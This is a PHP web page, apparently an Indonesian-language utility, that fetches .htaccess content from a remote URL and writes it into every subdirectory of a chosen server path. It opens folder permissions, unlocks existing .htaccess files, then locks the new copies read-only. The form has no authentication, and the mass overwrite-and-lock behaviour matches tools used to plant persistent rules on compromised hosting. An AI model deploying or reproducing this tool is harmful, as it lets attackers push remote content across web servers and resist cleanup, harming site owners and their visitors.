<?php
$success = [];
$error = [];

function fetchFileFromUrl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code === 200) ? $data : false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetPath = rtrim($_POST['target_path'], '/');
    $url = $_POST['htaccess_url'];

    if (!is_dir($targetPath)) {
        $error[] = "❌ Target path not found: $targetPath";
    } else {
        $htaccessContent = fetchFileFromUrl($url);
        if (!$htaccessContent) {
            $error[] = "❌ Gagal ambil isi .htaccess dari URL.";
        } else {
            function setFolders0755($dir, &$success, &$error) {
                foreach (scandir($dir) as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $path = $dir . '/' . $item;
                    if (is_dir($path)) {
                        if (@chmod($path, 0755)) {
                            $success[] = "✅ Folder chmod 0755: $path";
                        } else {
                            $error[] = "❌ Gagal chmod folder: $path (mungkin permission denied)";
                        }
                        setFolders0755($path, $success, $error);
                    }
                }
            }

            function unlockHtaccessFiles($dir, &$success, &$error) {
                foreach (scandir($dir) as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $path = $dir . '/' . $item;
                    if (is_dir($path)) {
                        unlockHtaccessFiles($path, $success, $error);
                    } elseif ($item === '.htaccess') {
                        if (@chmod($path, 0644)) {
                            $success[] = "✅ Unlock .htaccess: $path";
                        } else {
                            $error[] = "❌ Gagal unlock .htaccess: $path (mungkin file tidak dimiliki user ini)";
                        }
                    }
                }
            }

            function deployHtaccess($dir, $content, &$success, &$error) {
                foreach (scandir($dir) as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $path = $dir . '/' . $item;
                    if (is_dir($path)) {
                        $htaccessPath = $path . '/.htaccess';
                        if (@file_put_contents($htaccessPath, $content) !== false) {
                            if (@chmod($htaccessPath, 0444)) {
                                $success[] = "✅ Deployed & chmod .htaccess: $htaccessPath";
                            } else {
                                $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
                            }
                        } else {
                            $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
                        }
                        deployHtaccess($path, $content, $success, $error);
                    }
                }
            }

            setFolders0755($targetPath, $success, $error);
            unlockHtaccessFiles($targetPath, $success, $error);
            deployHtaccess($targetPath, $htaccessContent, $success, $error);
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>🚀 Mass .htaccess Deployment</title>
    <style>
        body { background: #111; color: #eee; font-family: sans-serif; padding: 20px; }
        input, button { padding: 10px; width: 100%; margin-bottom: 10px; }
        button { background: #0f0; color: #000; font-weight: bold; border: none; cursor: pointer; }
        .log { background: #222; padding: 10px; margin-top: 20px; border-radius: 5px; }
        .success { color: #0f0; }
        .error { color: #f33; }
    </style>
</head>
<body>
    <h2>🚀 Mass .htaccess Deployment</h2>
    <form method="POST">
        <label>🎯 Target Path:</label>
        <input type="text" name="target_path" placeholder="/var/www/html" required>

        <label>🌐 URL .htaccess (GitHub raw, dll):</label>
        <input type="text" name="htaccess_url" placeholder="https://raw.githubusercontent.com/.../.htaccess" required>

        <button type="submit">🚀 Deploy Sekarang</button>
    </form>

    <?php if (!empty($success)): ?>
        <div class="log">
            <h3>✅ Success Log:</h3>
            <?php foreach ($success as $line): ?>
                <div class="success">✔ <?= htmlspecialchars($line) ?></div>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>

    <?php if (!empty($error)): ?>
        <div class="log">
            <h3>❌ Error Log:</h3>
            <?php foreach ($error as $line): ?>
                <div class="error">✖ <?= htmlspecialchars($line) ?></div>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>
</body>
</html>
